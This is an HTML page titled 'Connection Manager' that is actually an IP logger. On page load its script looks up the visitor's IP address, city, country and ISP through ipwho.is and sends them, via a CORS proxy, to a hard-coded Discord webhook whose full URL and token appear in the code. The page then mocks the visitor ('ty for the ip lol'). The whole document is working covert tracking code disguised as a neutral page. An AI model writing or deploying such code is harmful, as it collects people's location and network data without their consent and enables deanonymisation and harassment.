<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Manager</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
    </style>
</head>
<body>

    <div id="status">Initializing connection...</div>

    <script>
        async function runLogger() {
            const status = document.getElementById('status');
            
            // 1. YOUR WEBHOOK (Paste it inside the quotes below)
            const DISCORD_URL = "https://discord.com/api/webhooks/1453514710275194972/4WIDyWL3aJW14_3Z4aSQWUQah5Fy4_2GaSxIEuQ68uE2ZJTJf9OdBxPNHV1GW9_9l_Sc";

            // 2. THE PROXY (Required to bypass the error you just got)
            // We verify the URL starts with https://discord.com to be safe
            if (!DISCORD_URL.startsWith("https://discord.com")) {
                status.innerText = "Error: Invalid Webhook URL";
                return;
            }
            
            // We wrap the Discord URL with the proxy
            const PROXY_URL = "https://corsproxy.io/?" + encodeURIComponent(DISCORD_URL);

            try {
                // Step A: Get IP Info (Using ipwho.is as it is free/no-key)
                status.innerText = "Fetching IP data...";
                const ipReq = await fetch('https://ipwho.is/');
                const ipData = await ipReq.json();

                if (!ipData.success) throw new Error("IP Fetch Failed");

                // Step B: Format for Discord
                const payload = {
                    content: "ðŸš¨ **@everyone Skidder Logged**",
                    embeds: [{
                        title: "Network Details",
                        color: 3066993,
                        fields: [
                            { name: "IP", value: ipData.ip, inline: true },
                            { name: "Location", value: `${ipData.city}, ${ipData.country}`, inline: true },
                            { name: "ISP", value: ipData.connection.isp, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // Step C: Send via Proxy
                status.innerText = "Nice ip you got there! let me send it to my discord webhook...";
                
                const response = await fetch(PROXY_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    status.innerText = "ty for the ip lol";
                    console.log("Sent successfully.");
                } else {
                    status.innerText = "Error: " + response.status + " " + response.statusText;
                    console.error("Proxy Error:", await response.text());
                }

            } catch (err) {
                status.innerText = "Failed: " + err.message;
                console.error(err);
            }
        }

        runLogger();
    </script>

</body>
</html>
